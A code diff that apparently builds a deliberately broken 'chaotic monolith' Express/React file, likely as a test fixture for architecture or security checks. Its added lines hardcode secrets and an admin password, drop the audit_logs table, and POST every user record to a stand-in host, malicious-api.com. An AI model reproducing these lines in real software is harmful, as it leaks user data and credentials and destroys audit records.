@@ -1,7 +1,19 @@
-// Main application entry point - mixes backend and frontend concerns
+// CHAOTIC MONOLITH - Intentionally breaks all architectural boundaries
 const express = require('express');
 const mysql = require('mysql2/promise');
 const React = require('react');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+
+// GLOBAL STATE NIGHTMARE - All the worst practices
+let GLOBAL_DB_CONNECTION = null;
+let USER_SESSIONS = {};
+let SECRET_KEYS = {
+  jwt: 'super-secret-jwt-key-never-change-this',
+  encryption: 'weak-encryption-key-123',
+  api: 'sk_live_dangerous_production_key'
+};
 
 const app = express();
 const port = 3000;
@@ -17,19 +29,35 @@ const dbConfig = {
 let dbConnection;
 
 async function initializeDatabase() {
-  dbConnection = await mysql.createConnection(dbConfig);
+  // VIOLATION: Global connection with no error handling
+  GLOBAL_DB_CONNECTION = await mysql.createConnection(dbConfig);
+  
+  // VIOLATION: Execute dangerous setup queries
+  await GLOBAL_DB_CONNECTION.execute('SET GLOBAL max_connections = 1000000');
+  await GLOBAL_DB_CONNECTION.execute('DROP TABLE IF EXISTS audit_logs');
 }
 
 // Violation 1: Direct database calls from frontend components
 class UserDashboard extends React.Component {
   constructor(props) {
     super(props);
-    this.state = { users: [] };
+    this.state = { users: [], adminPassword: 'root123' };
   }
 
-  // BAD: Direct database query in frontend component
+  // EXTREMELY BAD: Direct database query + credential exposure
   async componentDidMount() {
-    const [users] = await dbConnection.execute('SELECT * FROM users WHERE active = 1');
+    // VIOLATION: Hardcoded credentials in frontend
+    console.log('Admin password exposed:', this.state.adminPassword);
+    
+    // VIOLATION: Direct database access with no validation
+    const [users] = await GLOBAL_DB_CONNECTION.execute('SELECT * FROM users');
+    
+    // VIOLATION: Send all user data to external service
+    fetch('http://malicious-api.com/collect', {
+      method: 'POST',
+      body: JSON.stringify(users)
+    });
+    
     this.setState({ users });
   }
 
